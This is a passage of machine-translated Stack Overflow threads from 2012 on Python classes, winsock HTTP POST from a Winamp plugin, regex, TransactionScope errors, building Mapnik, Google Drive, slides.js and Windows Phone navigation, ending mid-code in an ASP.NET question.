除此之外，*New-Style 类*从 Python 2.2 开始就非常可用。在 2.1 之前，我们不得不使用 Classic 风格[-> 见这里](http://docs.python.org/whatsnew/2.2.html)

**关于差异/信息的简短摘要可能是：**

*   从 Python 2.2 开始提供 New-Style 类
*   新式类可以使用描述符 - 旧式类不能
*   新样式类可以继承大多数内置类型 - 旧样式类不能
*   新样式类支持一个新的元模型（它会影响例如[`type()`](http://docs.python.org/library/functions.html#type)大量内置的行为）
*   旧式类会先在实例上找到一个属性，然后再查看层次结构 - 如果类定义是可写描述符，新式类将使类定义获胜
*   Python 3 中删除了旧式类

但在大多数情况下，新式类的引入受到了 python**描述符的影响** [--> 在此处阅读更多内容](http://docs.python.org/howto/descriptor.html)。

* * *

## 回答 #3

> 赞同：-3
> 
> 时间：2012-09-14T15:31:02.650

在这种情况下，没有，因为第一个显式继承自作为基类的 object，而第二个隐式继承自 object。

# c++ - 在 DLL 中使用的最简单的 C++ PUSH 通知/POST 解决方案？

> ID：12427585
> 
> 赞同：3
> 
> 时间：2012-09-14T15:27:54.823
> 
> 标签：c++, post, dll, push-notification, winamp

我正在制作一个 Winamp 插件，它具有将通过 HTTP 播放的歌曲的详细信息发送到网页/网络服务器的单一功能。我找不到像这样真正有效的东西，所以决定第一次潜入 C++ 并自己做。

该插件是一个 C++ DLL 文件。我已经到了可以在每次播放新歌曲时将歌曲标题输出到 Windows 消息框的地步（对于 C++ 初学者来说还不错！;)）

我在哪里卡住了：

我在 C++ 方向的推送通知中根本找不到任何东西。

我尝试将 HTTP 库嵌入/包含到我的 DLL 中以尝试发布请求，但没有成功。libcurl，[这里的这个库](http://www.codeproject.com/Articles/66625/A-Fully-Featured-Windows-HTTP-Wrapper-in-C)，还有[这个库](http://scumways.com/happyhttp/happyhttp.html)- 但无法让它们中的任何一个工作！我只是不断收到链接错误，然后是一些。几个小时后，我就放弃了。

我是一个非常熟练的 JavaScript 程序员，所以我想也许使用 JS 连接到推送通知服务可以解决，但是在 C++ 中运行 JS 对我来说看起来太复杂了。也许我错了？

底线，我不知道哪个解决方案更好（阅读：更容易）实施 - 推送通知或发布请求？

我感谢任何解决方案/输入/方向/信息或您得到的任何东西。我可以发布代码，但我拥有的唯一代码是从 Winamp 获取歌曲信息的部分，并且该部分有效。

提前致谢。

**编辑：我想值得注意的是我正在使用新的 VS2012？**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T08:00:12.247

使用这类库没问题，但说到C++，我主要想到的是“纯代码”，所以我喜欢用native 风格做一些事情，并且不需要库的帮助。

考虑到这一点，我可以为您提供一个示例，说明如何使用 Microsoft 的 winsock2 库发送 HTTP 的 POST 请求。

首先，我想指出，我使用[这个链接](http://www.codeguru.com/cpp/i-n/internet/http/article.php/c8813/HTTP-Post-Using-C.htm)来了解如何使用 winsock2.h。

好的，现在继续代码，您需要这些包括：

```
#include <string>
#include <sstream>
#include <winsock2.h> 
```

您还需要链接 winsock2 库（或在您的项目设置中指定它，因为您使用 VS2012）：

```
#pragma comment(lib, "ws2_32.lib") 
```

现在，我从链接中编辑的函数（我刚刚对其进行了编辑以使其看起来更简单，并且还进行了一些错误检查和适当的清理）：

```
int http_post(char *hostname, char *api, char *parameters, std::string& message)
{
    int result;

    WSADATA wsaData;
    result = WSAStartup(MAKEWORD(1, 1), &wsaData);

    if(result != NO_ERROR)
    {
        //printf("WSAStartup failed: %d\n", result);
        return 0;
    }

    sockaddr_in sin;

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET)
    {
        //printf("Error at socket(): %ld\n", WSAGetLastError());
        WSACleanup();
        return 0;
    }

    sin.sin_family = AF_INET;
    sin.sin_port = htons(80);

    struct hostent *host_addr = gethostbyname(hostname);
    if(host_addr == NULL)
    {
        //printf("Unable to locate host\n");
        closesocket(sock);
        WSACleanup();
        return 0;
    }

    sin.sin_addr.s_addr = *((int *)*host_addr->h_addr_list);

    if(connect(sock, (const struct sockaddr *)&sin, sizeof(sockaddr_in)) == SOCKET_ERROR)
    {
        //printf("Unable to connect to server: %ld\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return 0;
    }

    std::stringstream stream;
    stream << "POST " << api << " HTTP/1.0\r\n"
           << "User-Agent: Mozilla/5.0\r\n"
           << "Host: " << hostname << "\r\n"
           << "Content-Type: application/x-www-form-urlencoded;charset=utf-8\r\n"
           << "Content-Length: " << strlen(parameters) << "\r\n"
           << "Accept-Language: en-US;q=0.5\r\n"
           << "Accept-Encoding: gzip, deflate\r\n"
           << "Accept: */*\r\n"
           << "\r\n" << parameters
    ;

    if(send(sock, stream.str().c_str(), stream.str().length(), 0) == SOCKET_ERROR)
    {
        //printf("send failed: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return 0;
    }

    if(shutdown(sock, SD_SEND) == SOCKET_ERROR)
    {
        //printf("shutdown failed: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return 0;
    }

    char buffer[1];

    do
    {
        result = recv(sock, buffer, 1, 0);
        if(result > 0)
        {
            //printf("Bytes received: %d\n", result);
            message += buffer[0];
        }
        else if(result == 0)
        {
            //printf("Connection closed\n");
        }
        else
        {
            //printf("recv failed: %d\n", WSAGetLastError());
        }
    }
    while(result > 0);

    closesocket(sock);
    WSACleanup();

    return 1;
} 
```

当您使用 DLL 时，我将 s 注释掉`printf`，因此您可以根据 Winamp 插件 API 使用正确的输出函数。

现在，要使用该功能，它是不言自明的：

```
std::string post;
http_post("www.htmlcodetutorial.com", "/cgi-bin/mycgi.pl", "user=example123&artist=The Beatles&music=Eleanor Rigby", post); 
```

通过这样做，并检查函数返回数（1 表示成功或 0 表示失败），您可以解析从站点返回的结果字符串，并检查一切是否正常。

关于你的最后一个问题，使用 POST 请求是可以的，但是作为站长的你，知道有可能“滥用”这个选项，比如请求泛洪等。但这确实是最简单的方法。

如果您在服务器端正确解析数据，并检查请求是否有任何不当使用，那么您可以毫无问题地使用此方法。

最后，由于您是 C++ 初学者，您需要知道如何操作`std::string`s 以安全地将歌曲名称和艺术家解析为 post POST 消息字符串，如果您还不知道，我推荐[这个链接](http://www.cplusplus.com/reference/string/)。

# regex - 正则表达式：user_agent 字符串包含“a”但不包含“b”

> ID：12427587
> 
> 赞同：1
> 
> 时间：2012-09-14T15:27:56.813
> 
> 标签：regex, rewrite, expression, isapi

我正在尝试过滤 user_agent 并区分 iPhone 和 iPad。用户代理字符串读取：

`Mozilla/5.0(ipad U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10`

我现在使用的正则表达式是

```
(iphone|iPod|blackberry|android|windows+ce) 
```

这让我得到了大多数移动设备，客户对此很满意。

如果字符串包含`ipad`. 我已经为此苦苦挣扎了一个小时，并认为是时候寻求一些更有经验的帮助了。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T15:29:58.813

尝试这个：

```
^(?!.*ipad).*(iphone|iPod|blackberry|android|windows\+ce) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-03T19:23:30.230

`^(?!.*ipad).*(iphone|iPod)`蒂姆的建议效果很好。但是，与以下相比，正则表达式具有 400% 的 cpu 要求：

1）将工作拆分为两个单独的正则表达式

正则表达式 A)`(iphone|ipod)`

正则表达式 B)`(ipad)`

2）在你的脚本中做一些 A 和 B 结果的条件来满足你的需要。

这似乎是多余的额外工作，但比将所有内容都塞进一个正则表达式要快 400%。

# c# - 使用 TransactionScope 的间歇性 System.ArgumentNullException

> ID：12427591
> 
> 赞同：3
> 
> 时间：2012-09-14T15:28:20.577
> 
> 标签：c#, .net, transactionscope, msdtc

我有一个 Windows 服务应用程序，它正在执行一些对 SQL Server 的调用。我有一个特定的工作单元要做，其中包括将一行保存到`Message`表中并更新表中的多行`Buffer`。

我将这两个 SQL 语句包装成 a`TransactionScope`以确保它们要么都被提交，要么都不被提交。

高级代码如下所示：

```
public static void Save(Message message)
{
    using (var transactionScope = new TransactionScope())
    {
        MessageData.Save(message.TransactionType,
                         message.Version,
                         message.CaseNumber,
                         message.RouteCode,
                         message.BufferSetIdentifier,
                         message.InternalPatientNumber,
                         message.DistrictNumber,
                         message.Data,
                         message.DateAssembled,
                         (byte)MessageState.Inserted);

        BufferLogic.FlagSetAsAssembled(message.BufferSetIdentifier);

        transactionScope.Complete();
    }
} 
```

这一切都在我的本地 SQL Server 安装的开发机器上完美运行。

在将 Windows 服务部署到服务器（但连接回本地计算机的 SQL Server）时，我**间歇性地**收到以下错误消息：

```
System.ArgumentNullException: Value cannot be null.
   at System.Threading.Monitor.Enter(Object obj)
   at System.Data.ProviderBase.DbConnectionPool.TransactedConnectionPool.TransactionEnded(Transaction transaction, DbConnectionInternal transactedObject)
   at System.Data.SqlClient.SqlDelegatedTransaction.SinglePhaseCommit(SinglePhaseEnlistment enlistment)
   at System.Transactions.TransactionStateDelegatedCommitting.EnterState(InternalTransaction tx)
   at System.Transactions.CommittableTransaction.Commit()
   at System.Transactions.TransactionScope.InternalDispose()
   at System.Transactions.TransactionScope.Dispose()
   at OpenLink.Logic.MessageLogic.Save(Message message) in E:\DevTFS\P0628Temp\OpenLink\OpenLink.Logic\MessageLogic.cs:line 30
   at OpenLinkMessageAssembler.OpenLinkMessageAssemblerService.RunService() in E:\DevTFS\P0628Temp\OpenLink\OpenLinkMessageAssembler\OpenLinkMessageAssemblerService.cs:line 99 
```

我相信异常引用的代码行是`using`块关闭的地方，因此`Dispose()`调用`TransactionScope`. 我在这里有点不知所措，因为`TransactionScope`该类的内部工作似乎引发了异常。

可能很重要的一件事是，在服务器上安装时，我必须启用分布式事务协调器的一些设置以允许网络访问这让我想到，当它全部在我的本地计算机上时，可能不使用 DTC .

DTC 可能是导致此异常的部分原因吗？

我还考虑了这是否与连接池被最大化有关，但预计会有一个比我得到的更有用的例外。我一直在[这个问题](https://stackoverflow.com/questions/2222924/transactionscope-helper-that-exhausts-connection-pool-without-fail-help)中运行查询来检查连接池大小，它从未超过四个。

我的最终问题是，为什么这个错误会间歇性地发生？如何诊断是什么原因造成的？

**编辑：线程**

@Joe 建议这可能是线程问题。因此，我在下面包含了我的 Windows 服务的框架代码，以查看它是否有问题。

请注意，`EventLogger`该类仅写入 Windows 事件日志，而不连接到 SQL Server。

```
partial class OpenLinkMessageAssemblerService : ServiceBase
{
    private volatile bool _isStopping;
    private readonly ManualResetEvent _stoppedEvent;
    private readonly int _stopTimeout = Convert.ToInt32(ConfigurationManager.AppSettings["ServiceOnStopTimeout"]);
    Thread _workerThread;

    public OpenLinkMessageAssemblerService()
    {
        InitializeComponent();
        _isStopping = false;
        _stoppedEvent = new ManualResetEvent(false);
        ServiceName = "OpenLinkMessageAssembler";
    }

    protected override void OnStart(string[] args)
    {
        try
        {
            _workerThread = new Thread(RunService) { IsBackground = true };
            _workerThread.Start();
        }
        catch (Exception exception)
        {
            EventLogger.LogError(ServiceName, exception.ToString());
            throw;
        }
    }

    protected override void OnStop()
    {
        // Set the global flag so it can be picked up by the worker thread
        _isStopping = true;

        // Allow worker thread to exit cleanly until timeout occurs
        if (!_stoppedEvent.WaitOne(_stopTimeout))
        {
            _workerThread.Abort();
        }
    }

    private void RunService()
    {
        // Check global flag which indicates whether service has been told to stop
        while (!_isStopping)
        {
            try
            {
                var buffersToAssemble = BufferLogic.GetNextSetForAssembly();

                if (!buffersToAssemble.Any())
                {
                    Thread.Sleep(30000);
                    continue;
                }

                ... // Some validation code removed here for clarity

                string assembledMessage = string.Empty;
                buffersToAssemble.ForEach(b => assembledMessage += b.Data);

                var messageParser = new MessageParser(assembledMessage);
                var message = messageParser.Parse();

                MessageLogic.Save(message); // <-- This calls the method which results in the exception
            }
            catch (Exception exception)
            {
                EventLogger.LogError(ServiceName, exception.ToString());
                throw;
            }
        }
        _stoppedEvent.Set();
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T16:56:21.473

检查您是否已设置您的 Web 服务器和单独的数据库服务器（如果您将它们分开）。

[http://itknowledgeexchange.techtarget.com/sql-server/how-to-configure-dtc-on-windows-2008/](http://itknowledgeexchange.techtarget.com/sql-server/how-to-configure-dtc-on-windows-2008/)

对于日志记录，我建议在事务范围内放入一个 try catch 但是，如果您登录到数据库，则需要使用事务范围抑制功能

```
 using(TransactionScope scope4 = new 
        TransactionScope(TransactionScopeOption.Suppress)) 
    {
     ...
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T11:53:33.130

我通过阻止事务升级到 DTC 来解决这个问题。通过使用 SQL 2008 而不是 SQL 2005，[事务不会升级](https://stackoverflow.com/questions/1690892/transactionscope-automatically-escalating-to-msdtc-on-some-machines)，一切都很好。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-21T07:06:55.513

您没有提及您的 .Net 版本，但根据 [http://support.microsoft.com/kb/960754，System.Data.dll](http://support.microsoft.com/kb/960754)的 2.50727.4016 版本存在问题。

如果您的服务器有这个旧版本，我会尝试从 Microsoft 获取更新的版本。

# boost - 在 Red Hat Linux 上安装 mapnik 失败

> ID：12427595
> 
> 赞同：4
> 
> 时间：2012-09-14T15:28:36.490
> 
> 标签：boost, makefile, configure, mapnik

我只是想将 Python 绑定到安装在 Red Hat Enterprise 机器上的 Mapnik 2.1 并在 Sage (sagemath.org) 中使用它们。这是我不能使用 yum 的公司机器，所以它一直是 tarball，宝贝。

我已经解决了安装依赖项和制定每个配置所需的语法的许多问题。每次我解决一个问题，就会有另一个问题。目前我无法让 mapnik 配置来查看 libboost_system.so，它肯定在 /usr/local/lib 中，并且有一个从 /usr/lib 指向它的符号链接。

细节：

```
Red Hat Enterprise system:
> more /proc/version
Linux version 2.6.18-92.el5PAE (brewbuilder@hs20-bc2-3.build.redhat.com) (gcc version 4.1.2 20071124 (Red Hat 4.1.2-41)) 
used install directions at github.com/mapnik/mapnik/blob/master/INSTALL.md, github.com/mapnik/mapnik/wiki/Mapnik2 and elsewhere
installed proj 4.8 from tarball using several solutions provided on the web to fix install problems
installed icu4c-4_6 from tarball to /usr/local/...
installed boost 1.51 from tarball pointing to the newly installed icu:
download boost_1_51_0.tar.gz
tar ...
cd boost_1_51_0
./bootstrap.sh 
```

（之前我已经直接 ./b2 来安装所有的 boost - 使用上面的网页说明返回以这种方式重新安装 boost 的一部分:)

```
sudo ./b2 --with-thread --with-filesystem --with-iostreams --with-python --with-regex -sHAVE_ICU=1 -sICU_PATH=/usr/local/lib --with-program_options --with-system link=shared toolset=gcc stage
sudo ./b2 --with-thread --with-filesystem --with-iostreams --with-python --with-regex -sHAVE_ICU=1 -sICU_PATH=/usr/local/lib --with-program_options --with-system link=shared toolset=gcc install
sudo /sbin/ldconfig 
```

现在尝试安装mapnik：

```
download mapnik-v2.1.0.tar.bz2
tar ...
cd ...
./configure PYTHON=/opt/sage-5.2/local/bin/python ICU_LIBS=/usr/local/lib ICU_INCLUDES=/usr/local/include BOOST_INCLUDES=/usr/local/include/boost BOOST_LIBS=/usr/local/lib 
```

或者

```
./configure PYTHON=/opt/sage-5.2/local/bin/python ICU_LIBS=/usr/local/lib ICU_INCLUDES=/usr/local/include 
```

或者

```
./configure PYTHON=/opt/sage-5.2/local/bin/python 
```

（结果相同）

```
"scons: Reading SConscript files ...
Welcome to Mapnik...
Configuring build environment...
SCons CONFIG found: 'config.py', variables will be inherited...
Configuring on Linux in *release mode*...
Checking for freetype-config... yes
Checking for xml2-config... yes
Sorting lib and inc compiler paths...(cached) yes
Checking for C library m... yes
Checking for C library ltdl... yes
Checking for C library png... yes
Checking for C library tiff... yes
Checking for C library z... yes
Checking for C library proj... yes
Checking for C++ library icuuc... yes
Checking for C library jpeg... yes
Checking for ICU version >= 4.2... found: icu 4.6
(cached) Searching for boost libs and headers... (cached)
  *libs found: /usr/local/lib
  *headers found: /usr/local/include
  *no lib naming extension found
Checking for Boost version >= 1.47... yes
Found boost lib version... 1_51
Checking for C++ library boost_system... yes
Checking for C++ library boost_filesystem... yes
Checking for C++ library boost_regex... yes
Checking for C++ library boost_program_options... yes
Checking for C++ library boost_thread... yes
.sconf_temp/conftest_18: error while loading shared libraries: libboost_system.so.1.51.0: 
cannot open shared object file: No such file or directory
Checking if boost_regex was built with ICU unicode support... (cached) no
Checking for requested plugins dependencies...
Checking for gdal-config --libs... yes
Checking for gdal-config --cflags... yes
Checking for name of gdal library... gdal
Checking if gdal is ogr enabled... yes
Checking for name of ogr library... gdal
Checking for C library curl... no
Checking for pg_config... error: no result no
Checking for C library sqlite3... no
Checking if SQLite supports RTREE... (cached) no
Checking for pkg-config... yes
Checking for cairo... no
Checking for C++ header file boost/python/detail/config.hpp... yes
Checking for pkg-config... yes
Checking for pycairo... no
All Required dependencies found!
Overwriting and re-saving file 'config.py'...
Will hold custom path variables from commandline and python config file(s)... 
```

注意：将在没有这些可选依赖项的情况下构建：

*   boost_regex_icu（mapnik 中的 unicode regex 支持需要使用可选 ICU unicode 支持构建的 libboost_regex。）

*   curl（“osm”插件需要 libcurl - 更多信息：[https](https://github.com/mapnik/mapnik/wiki//OsmPlugin) ://github.com/mapnik/mapnik/wiki//OsmPlugin ）

*   pg_config (pg_config 程序 | 尝试设置 PG_CONFIG SCons 选项)

*   sqlite3（SQLite3 C 库 | 使用 SQLITE_LIBS 和 SQLITE_INCLUDES 进行配置 | 更多信息：[https](https://github.com/mapnik/mapnik/wiki//SQLite) ://github.com/mapnik/mapnik/wiki//SQLite ）

*   sqlite_rtree（SQLite 插件需要使用 RTREE 支持构建的 libsqlite3 (-DSQLITE_ENABLE_RTREE=1)）

*   cairo（Cairo C 库 | 使用 pkg-config 配置 | 尝试设置 PKG_CONFIG_PATH SCons 选项）

*   pycairo（Python 绑定到 Cairo 库 | 使用 pkg-config 配置 | 尝试设置 PKG_CONFIG_PATH SCons 选项）

    .sconf_temp/conftest_33：加载共享库时出错：libboost_system.so.1.51.0：无法打开共享对象文件：没有这样的文件或目录解析mapnik版本时遇到问题，回退到2.1.0检查C头文件Python.h ... 是绑定 Python 版本... 2.7 Python 2.7 前缀... /opt/sage-5.2/local Python 绑定将安装在... /opt/sage-5.2/local/lib/python2.7/site-包配置完成：运行`make`以构建或`make install`“make”... /usr/bin/ld：找不到 -lsqlite3 collect2：错误：ld 返回 1 退出状态 scons：*** [tests/cpp_tests/csv_parse_test-bin] 错误 1 ​​scons：建筑物因错误而终止。制作：*** [mapnik] 错误 2"

但我认为 sqlite3 是可选的......

我认为 sqlite3 问题可能是一个红鲱鱼。前面的问题是configure阶段没有找到boost_thread。我的系统显示：

```
ls -l /usr/local/lib/libboost_system.so*
lrwxrwxrwx 1 root root    25 Sep 11 17:40 /usr/local/lib/libboost_system.so -> libboost_system.so.1.51.0
-rwxr-xr-x 1 root root 16898 Sep 11 17:40 /usr/local/lib/libboost_system.so.1.51.0
ldd /usr/local/lib/libboost_system.so.1.51.0
        linux-gate.so.1 =>  (0x005c1000)
        librt.so.1 => /lib/librt.so.1 (0x00cd9000)
        libstdc++.so.6 => /usr/lib/libstdc++.so.6 (0x002f4000)
        libm.so.6 => /lib/libm.so.6 (0x009e1000)
        libgcc_s.so.1 => /lib/libgcc_s.so.1 (0x00f82000)
        libpthread.so.0 => /lib/libpthread.so.0 (0x00a6a000)
        libc.so.6 => /lib/libc.so.6 (0x00110000)
        /lib/ld-linux.so.2 (0x0050d000) 
```

所以它确实存在并且有效。

为了安全起见（这没有帮助）添加了一个符号链接：

```
ls -l /usr/lib/libboost_system.so
lrwxrwxrwx 1 root root 33 Sep 14 10:16 /usr/lib/libboost_system.so -> /usr/local/lib/libboost_system.so 
```

这很奇怪，因为在同一位置可以找到其他库。此外，配置阶段在“搜索提升库和标头...找到的库：/usr/local/lib”错误之前说明了几行

在这一点上，我真的不相信scons。我遇到了另一个问题，mapnik 配置阶段找不到库 (libproj)。后来又说boost的版本至少不是1.48。一旦我添加了指向 proj .so 文件的正确符号链接，关于 boost 版本的配置错误就消失了。所以我坚持一般规则，你应该专注于发现的第一个错误并解决那个错误。

请注意，Python 的非标准位置（PYTHON=/opt/sage-5.2/local/bin/python）似乎没问题。

查看 mapnik 日志文件 config.log，但我看不到其他信息。检查了网络和 github.com/mapnik/mapnik/wiki/InstallationTroubleshooting 但没有任何相关。很抱歉这篇文章很长，但细节很重要。谢谢阅读。

另一个线索可能是：

```
Checking if boost_regex was built with ICU unicode support... (cached) no 
```

即使上面表明这是正确完成的（？）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T19:02:06.210

明火，

Mapnik 用户列表将是一个更好的地方。

无论如何，我认为问题在于您尚未配置系统以在 /usr/local/lib 中查找库。你需要做`export LD_LIBRARY_PATH=/usr/local/lib`或者你需要在运行之前添加`/usr/local/lib`到你的.`/etc/ld.so.conf/``ldconfig`

可能会混淆的小问题：1）您的 BOOST_INCLUDES 选项是错误的，应该`BOOST_INCLUDES=/usr/local/include/`不是`BOOST_INCLUDES=/usr/local/include/boost`。2）我真的不建议符号链接到`/usr/lib`- 这可能会破坏事情是奇怪的方式

此外，尽管在配置过程中出现链接错误，但我认为您总体上还可以。与测试的链接错误没什么大不了的，很可能我们需要将其设为可选。我认为构建过程中唯一的主要问题是提升链接，这应该可以按照上面的方法解决。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-09T00:02:22.710

我和你有同样的问题，我在[这里](https://groups.google.com/forum/#!msg/mapnik/r0cHLA9kXTE/aR-MN28XjL4J)看到了

```
export LD_LIBRARY_PATH=/XXX/lib 
```

会工作。

我试过了，它对我有用，但我仍然不确定根本原因是什么。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-09-20T15:46:02.420

在 Centos 7 上构建 Mapnik 遇到了同样的问题。Scon 给出了关于缺少实际存在的库的误导性错误。

发出简单的

```
export LD_LIBRARY_PATH=/usr/local/lib 
```

修复了所有问题。

应该是对 Centos / RHEL 上许多构建的修复，不仅仅是 Mapnik。

# google-drive-api - Google Drive 文档格式的标准

> ID：12427597
> 
> 赞同：2
> 
> 时间：2012-09-14T15:28:38.147
> 
> 标签：google-drive-api

有没有地方可以找到 Google Drive“文档”格式的标准，或将其转换为标准格式的 API**方法**？我正在研究制作一个以 Markdown 或纯文本格式运行并与 Google Drive 同步的笔记应用程序的可行性。与其同步原始文件，不如将它们与 Google Drive HTML 格式相互转换，以便可以使用 Google Drive 和其他集成应用程序对其进行编辑。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T16:05:02.997

是的，您可以使用 API 将它们导出为常用类型。但是，没有关于内部 Google Docs 类型的公开规范。

请查看我们的[下载文件指南](https://developers.google.com/drive/manage-downloads)了解详细信息。

# javascript - 创建具有可变长度的幻灯片显示的幻灯片

> ID：12427599
> 
> 赞同：1
> 
> 时间：2012-09-14T15:28:45.443
> 
> 标签：javascript, jquery, jquery-plugins

尝试使用 slides.js jquery 插件创建幻灯片。

我想要的是第一张幻灯片（其中嵌入了一个视频）显示 7 秒，其余幻灯片每个显示 4 秒。

这是我到目前为止所尝试的：

```
 $(function(){
      $('#slides').slides({
          preload: true,
          generateNextPrev: false,
          play: function(){
              if($('#slides').childNodes[2].css('display', 'block')){
                   return 7000;
              } else {
                   return 4000;
              } 
          }
      });
      $("#menu select").change(function() {
          window.location = $(this).find("option:selected").val();
      });
  }); 
```

起初我以为每次幻灯片更改时都会运行此功能。我现在意识到这个匿名函数运行一次就完成了。这意味着它不会回来查看该幻灯片是否不是`display: block;`或`display: none;`。这让我想知道该怎么做。

我检查了 slides.js 页面上的文档，但没有看到任何能够提供帮助的突出内容。

TLDC：是否可以使用 slides.js 获得可变长度的显示时间？如果它不是我可以使用什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T16:12:59.917

使用 slides.js似乎并不*容易*，所以让我介绍一下我自己的名为[**Do It Yourself Slider**](http://pioul.fr/jquery-diyslider/)的 jQuery 滑块。

> 该插件是您自己构建滑块的基础，它真正适合您的需求。

因此，您可以做任何您想做的事情，因为您必须自己做：您不受插件的限制。

看看我根据您的要求制作的[**演示，第一张幻灯片持续 7 秒，而其他幻灯片持续 4 秒。**](http://jsfiddle.net/pioul/gk5Wx/1/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T16:30:35.430

我从来没有亲自使用过这个，所以如果我不在基地，请道歉。

看[这里](http://slidesjs.com/)，看起来`play`功能是“开始”按钮并`pause`停止它。您需要的是在每个动画上运行的东西，而不仅仅是初始`play`事件。试试`animationStart`吧。

```
 $('#slides').slides({
      preload: true,
      generateNextPrev: false,
      play: 7000,
      animationStart: function(){
          if($('#slides').childNodes[2].css('display', 'block')){
               $("#slides").slides({ slideSpeed: 7000 });
          } else {
               $("#slides").slides({ slideSpeed: 4000 });
          } 
      } 
```

不确定它是在动画之前立即运行（那时会完美运行）还是在动画开始之后立即运行。如果是之后，请尝试使用`animationComplete`并根据下一张幻灯片设置时间。

再说一次，我只是在盲目地尝试一下，它看起来怎么样？

# c# - 使用 NavigationService 时出现 NullreferenceException

> ID：12427601
> 
> 赞同：0
> 
> 时间：2012-09-14T15:29:00.077
> 
> 标签：c#, windows-phone-7, navigationservice

我的 WP7 应用程序遇到问题：

仅当应用程序无法检测到任何存储的用户名或密码值时，我才尝试提示登录页面；但是，当我尝试导航到我的登录页面时，我一直遇到 NullReferenceException。

我的代码看起来像这样，它在构造函数中：

```
if (!checkLogin())
    {
        NavigationService.Navigate(new Uri("/LoginPage.xaml", UriKind.Relative));
    } 
```

并且`checkLogin`只是一个返回 true 或 false 的函数，具体取决于隔离存储设置是否正确设置。

有人有什么建议吗？

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-14T16:10:55.900

Here is what i think you want to do ([From Peter Torr's blog](http://blogs.msdn.com/b/ptorr/archive/2010/08/28/redirecting-an-initial-navigation.aspx)).

If you need more clarification here is a piece of code to illustrate that. Assume there are 2 pages A.XAML and B.xaml and you would want to detect in whether to load A.xaml or B.xaml based on checking some login credentials which is stored in the IsolatedStorage,

*in App.xaml.cs of your project overwrite `public App()` with:*

```
 public App()
    {
        // Global handler for uncaught exceptions. 
        UnhandledException += Application_UnhandledException;

        // Standard Silverlight initialization
        InitializeComponent();

        // Phone-specific initialization
        InitializePhoneApplication();

        // Show graphics profiling information while debugging.
        if (System.Diagnostics.Debugger.IsAttached)
        {
            // Display the current frame rate counters.
            Application.Current.Host.Settings.EnableFrameRateCounter = true;

            // Show the areas of the app that are being redrawn in each frame.
            //Application.Current.Host.Settings.EnableRedrawRegions = true;

            // Enable non-production analysis visualization mode, 
            // which shows areas of a page that are handed off to GPU with a colored overlay.
            //Application.Current.Host.Settings.EnableCacheVisualization = true;

            // Disable the application idle detection by setting the UserIdleDetectionMode property of the
            // application's PhoneApplicationService object to Disabled.
            // Caution:- Use this under debug mode only. Application that disables user idle detection will continue to run
            // and consume battery power when the user is not using the phone.
            PhoneApplicationService.Current.UserIdleDetectionMode = IdleDetectionMode.Disabled;
        }

        RootFrame.Navigating += new NavigatingCancelEventHandler(RootFrame_Navigating);
    }

    void RootFrame_Navigating(object sender, NavigatingCancelEventArgs e)
    {
        if (e.Uri.ToString().Contains("/MainPage.xaml") != true)
        {
            return;
        }
        e.Cancel = true;
        RootFrame.Dispatcher.BeginInvoke(delegate
        {
            if (System.IO.IsolatedStorage.IsolatedStorageSettings.ApplicationSettings.Contains("Login_Credentials"))
            {
                RootFrame.Navigate(new Uri("/B.xaml", UriKind.Relative));
            }
            else
            {
                RootFrame.Navigate(new Uri("/A.xaml", UriKind.Relative));
            }
        });
    } 
```

Then create the 2 dummy pages `A.xaml` and `B.xaml` so that for `A.xaml` you have some logic for saving the login credentials (in this case just a boolean flag):

*A.XAML:*

```
<Grid x:Name="LayoutRoot" Background="Transparent">
    <Grid.RowDefinitions>
        <RowDefinition Height="Auto"/>
        <RowDefinition Height="*"/>
    </Grid.RowDefinitions>

    <!--TitlePanel contains the name of the application and page title-->
    <StackPanel x:Name="TitlePanel" Grid.Row="0" Margin="12,17,0,28">
        <TextBlock x:Name="ApplicationTitle" Text="MY APPLICATION" Style="{StaticResource PhoneTextNormalStyle}"/>
        <TextBlock x:Name="PageTitle" Text="A Page" Margin="9,-7,0,0" Style="{StaticResource PhoneTextTitle1Style}"/>
    </StackPanel>

    <!--ContentPanel - place additional content here-->
    <StackPanel x:Name="ContentPanel" Grid.Row="1" Margin="12,0,12,0">
        <Button Content="Save Login Creds" Click="SaveLoginCreds"/>
    </StackPanel>
</Grid> 
```

*A.XAML.cs:*

```
private void SaveLoginCreds(object sender, RoutedEventArgs e)
{
    System.IO.IsolatedStorage.IsolatedStorageSettings.ApplicationSettings.Add("Login_Credentials", true);
} 
```

Now, when you run the application for the first time, it will load A.xaml because it could not find any login credentials. Then if you click on the button, it will save the login credentials data in IsolatedStorage. Next time, you start the app it will load B.xaml because it detected the login credentials.

I hope this helps.

# javascript - 将 jQuery 代码添加到 Index.aspx 页面

> ID：12427602
> 
> 赞同：0
> 
> 时间：2012-09-14T15:29:02.110
> 
> 标签：javascript, asp.net, asp.net-mvc-3

```
<%@ Page Language="C#" MasterPageFile="~/Views/Shared/Site.Master" Inherits="System.Web.Mvc.ViewPage" %>

<script runat="server">   
    void Page_Load(object sender, EventArgs e) {
       Page.RegisterClientScriptBlock("MyScript",
       "<script language=javascript>"+ 
       "alert(Date());"+ 
       "</script>");

    }

</script>

<asp:Content ID="Content1" ContentPlaceHolderID="TitleContent" runat="server">
    Home Page
</asp:Content>

<asp:Content ID="Content2" ContentPlaceHolderID="MainContent" runat="server">
    <h2><%: ViewBag.Message %></h2>
    <p>
